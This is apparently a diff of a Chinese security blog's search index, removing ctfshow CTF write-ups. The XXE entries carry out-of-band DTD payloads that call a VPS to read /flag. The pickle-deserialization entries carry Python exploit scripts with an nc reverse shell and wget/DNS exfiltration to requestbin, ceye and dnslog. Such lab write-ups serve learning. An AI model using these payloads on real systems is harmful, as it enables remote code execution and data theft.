class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.<span class="built_in">open</span>,posixfile.fileopen,</span><br><span class="line">platform.popen</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+        <tag>python</tag>
+        <tag>unserialize</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ping命令学习记录</title>
     <url>/2024/03/09/Ping%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="Ping命令"><a href="#Ping命令" class="headerlink" title="Ping命令"></a>Ping命令</h1><h2 id="题目样式"><a href="#题目样式" class="headerlink" title="题目样式"></a>题目样式</h2><p>看到ping或者ping命令却没有waf时就要想到命令注入。</p>
@@ -168,55 +460,6 @@
         <tag>命令执行</tag>
         <tag>Ping</tag>
       </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2024/03/27/ctfshow%20XEE%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h1><p>先看源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
-
-<p>与上题的区别是多了如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> </p>
-<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>不要不就好了？web374 的做法也没有加 <code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>。那就和 web374 做法一致就行</p>
-<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后加个换行符，发包内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml </span><br><span class="line"> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>成功接收到 flag</p>
-<p><img src="https://s2.loli.net/2024/03/27/6jUB9ZCleKzR1FH.png" alt="image-20240327172210794"></p>
-<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后再加个空格，发包内容为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>成功接收到 flag</p>
-<p><img src="https://s2.loli.net/2024/03/27/Lb2ykmlj4vscCDg.png" alt="image-20240327173015025"></p>
-<h1 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h1><p>先看源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
-
-<p>与上题的区别是多了如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 及其大小写。emmmm… web375 的绕过方法好像也没有大小写绕过啊？</p>
-<p>那就直接用 web375 的方法好了</p>
-<h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><p>先看源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>
-
-<p>与上题的区别是多了如下代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 和 <code>http</code> 及其大小写</p>
-<p>我们先看一下原 payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>有一个 <code>encoding=&quot;UTF-8&quot;</code> 的参数，那么我们就可以考虑除了 UTF-8 以外的其他编码，可以从 <a href="https://www.runoob.com/xml/xml-encoding.html">XML 编码 | 菜鸟教程 (runoob.com)</a> 中查看。</p>
-<p>那我们取其中一个试试看：</p>
-<p>先写一个编码转换的脚本（转 Unicode）：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utf8_str = <span class="built_in">input</span>(<span class="string">&quot;utf-8:&quot;</span>)</span><br><span class="line"></span><br><span class="line">unicode_str = utf8_str.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Unicode:&quot;</span>, unicode_str)</span><br></pre></td></tr></table></figure>
-
-<p>payload为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\xff\xfe&lt;\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00&quot;\x001\x00.\x000\x00&quot;\x00 \x00e\x00n\x00c\x00o\x00d\x00i\x00n\x00g\x00=\x00&quot;\x00U\x00T\x00F\x00-\x008\x00&quot;\x00?\x00&gt;\x00&#x27;</span><br></pre></td></tr></table></figure>
-
-]]></content>
   </entry>
   <entry>
     <title>XXE学习记录</title>
@@ -469,191 +712,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfshow python反序列化 刷题记录</title>
-    <url>/2024/03/25/ctfshow%20python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h1 id="web277"><a href="#web277" class="headerlink" title="web277"></a>web277</h1><p><img src="https://s2.loli.net/2024/03/22/KtLTjnsRNxovg54.png" alt="image-20240322142018874"></p>
-<p>进入靶场会看到<code>where is flag?</code>，Ctrl+U 检查源代码后可以看到注释的 html 标签</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>看到 <code>pickle.loads</code> 就知道是 python 反序列化没跑了。</p>
-<p>先看给的提示：传入的 data 先进行 base64 解码后在进行反序列化，所以我们序列化完成之后还要额外进行 base64 编码</p>
-<p>先简单的写一个爬虫脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;ls /&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://db665ec1-9a5b-4b46-a07e-045ad97ce824.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p><code>params</code> 的作用是将请求中的参数添加到 URL 中，以便将这些参数传递给服务器。在这种情况下，<code>params</code> 是一个字典，包含了要作为查询字符串添加到 URL 中的参数。最终的 URL 将包含这些参数，以便服务器可以根据这些参数来处理请求。</p>
-<p><img src="https://s2.loli.net/2024/03/25/aQXqUsPznAtljSu.png" alt="image-20240325161132826"></p>
-<p>无论是<code>ls /</code>还是<code>cat /flag</code>，回显都是 backdoor here：说明是一道 ”无回显“ 的题目。</p>
-<p>有两种方法：反弹 shell 和 的 dns 外带</p>
-<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>只需将脚本稍微改一下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;nc vps-ip port -e /bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://db665ec1-9a5b-4b46-a07e-045ad97ce824.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>然后先再 vps 上开启对应端口的监听在运行脚本（否则会报错）</p>
-<p>以1234端口为例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2024/03/25/LCyvSGJfg9Epw3q.png" alt="image-20240325162846097"></p>
-<p>运行脚本后则会显示：</p>
-<p><img src="https://s2.loli.net/2024/03/25/SiwdO6NEAnYuMve.png" alt="image-20240325162614566"></p>
-<p>此时就可以输入 Linux 命令来读取 flag 啦</p>
-<p><img src="https://s2.loli.net/2024/03/25/stgkjELFWx4zRCY.png" alt="image-20240325162748641"></p>
-<h2 id="dns-外带"><a href="#dns-外带" class="headerlink" title="dns 外带"></a>dns 外带</h2><h3 id="RequestBin"><a href="#RequestBin" class="headerlink" title="RequestBin"></a>RequestBin</h3><p>网址：<a href="http://requestbin.cn/">RequestBin — Collect, inspect and debug HTTP requests and webhooks</a></p>
-<p>先点击 Create a RequestBin 获取一个 url</p>
-<p>同样只需将脚本稍微改一下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget http://requestbin.cn:80/1cpartx1?a=`cat /flag`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p><code>wget</code>是一个在命令行下使用的下载工具，它可以从指定的URL下载文件。</p>
-<p>运行脚本就能得到 flag</p>
-<p><img src="https://s2.loli.net/2024/03/25/YGwpP7oOaM9IK52.png" alt="image-20240325170204095"></p>
-<h3 id="CEYE"><a href="#CEYE" class="headerlink" title="CEYE"></a>CEYE</h3><p>网址：<a href="http://ceye.io/">CEYE - Monitor service for security testing</a></p>
-<p>可以稍微参考一下这篇文章：<a href="https://blog.csdn.net/weixin_46706771/article/details/119031343">RCE绕过之无回显-CSDN博客</a>，也可以在 <a href="http://ceye.io/payloads">http://ceye.io/payloads</a> 中找相对应的 payload</p>
-<p>在 <a href="http://ceye.io/profile">http://ceye.io/profile</a> 下的 Identifier 可以获取对应 url</p>
-<p>同样只需将脚本稍微改一下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag`.zrne70.ceye.io&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>在 <a href="http://ceye.io/records/dns">http://ceye.io/records/dns</a> 即可找到 flag</p>
-<p><img src="https://s2.loli.net/2024/03/25/Uf6brd5ZWoIgSEa.png" alt="yqftM9pg8duAUEF"></p>
-<h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><p>网址：<a href="http://www.dnslog.cn/">DNSLog Platform</a></p>
-<p>先点击 Get SubDomain 获取一个 url</p>
-<p>同样只需将脚本稍微改一下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag`.n4jlw3.dnslog.cn&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>运行脚本后，回到 DNSlog 平台，点击 Refresh Record 就可看到被拼接的 flag</p>
-<p><img src="https://s2.loli.net/2024/03/27/ZoxwrS8jdOpfTyE.png" alt="image-20240327153137694"></p>
-<p>我还有其他想法：既然是命令执行，为什么不尝试一下无回显 RCE 中那些获取 flag 的方式？</p>
-<h2 id="tee"><a href="#tee" class="headerlink" title="tee"></a>tee</h2><p>用如下指令将 flag 的内容上传到 vps 中</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /flag | scp -q -P port_number -i /path/to/private_key_file - user@vps_ip:/path/on/vps/</span><br></pre></td></tr></table></figure>
-
-<p>这个命令的含义是将本地计算机上的<code>/flag</code>文件传输到远程VPS服务器上的指定路径。下面是命令中各个部分的解释：</p>
-<ul>
-<li><code>cat /flag</code>: 使用<code>cat</code>命令读取<code>/flag</code>文件的内容。</li>
-<li><code>|</code>: 管道符号，将<code>cat /flag</code>的输出作为输入传递给下一个命令。</li>
-<li><code>scp</code>: 用于在本地计算机和远程服务器之间安全地复制文件的命令。</li>
-<li><code>-q</code>: 在<code>scp</code>命令中使用<code>-q</code>参数表示安静模式，即不显示传输过程的详细信息。</li>
-<li><code>-P port_number</code>: 指定远程服务器的端口号。</li>
-<li><code>-i /path/to/private_key_file</code>: 指定用于身份验证的私钥文件的路径。</li>
-<li><code>user@vps_ip</code>: 远程VPS服务器的用户名和IP地址。</li>
-<li><code>:/path/on/vps/</code>: 在远程VPS服务器上指定的路径，将文件传输到该路径。</li>
-</ul>
-<p>更改下脚本：</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        payload = <span class="string">&#x27;wget `cat /flag | tee 1.txt`&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.popen,(payload,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">b=pickle.dumps(a)</span><br><span class="line">c=base64.b64encode(b)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://6ebe56d4-210d-4cbe-836f-078deeb4a9d0.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;<span class="string">&#x27;data&#x27;</span>:c&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h1 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h1><p>提示：过滤了 os.system</p>
-<p>使用上题脚本即可</p>
-<p>python 可以执行命令的函数：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, <span class="built_in">map</span>, <span class="built_in">input</span>,</span><br><span class="line">os.system, os.popen, os.popen2, os.popen3, os.popen4, os.<span class="built_in">open</span>, os.pipe,</span><br><span class="line">os.listdir, os.access,</span><br><span class="line">os.execl, os.execle, os.execlp, os.execlpe, os.execv,</span><br><span class="line">os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,</span><br><span class="line">os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,</span><br><span class="line">pickle.load, pickle.loads,cPickle.load,cPickle.loads,</span><br><span class="line">subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,</span><br><span class="line">commands.getstatusoutput,commands.getoutput,commands.getstatus,</span><br><span class="line">glob.glob,</span><br><span class="line">linecache.getline,</span><br><span class="line">shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,</span><br><span class="line">dircache.listdir,dircache.opendir,</span><br><span class="line">io.<span class="built_in">open</span>,</span><br><span class="line">popen2.popen2,popen2.popen3,popen2.popen4,</span><br><span class="line">timeit.timeit,timeit.repeat,</span><br><span class="line">sys.call_tracing,</span><br><span class="line">code.interact,code.compile_command,codeop.compile_command,</span><br><span class="line">pty.spawn,</span><br><span class="line">posixfile.<span 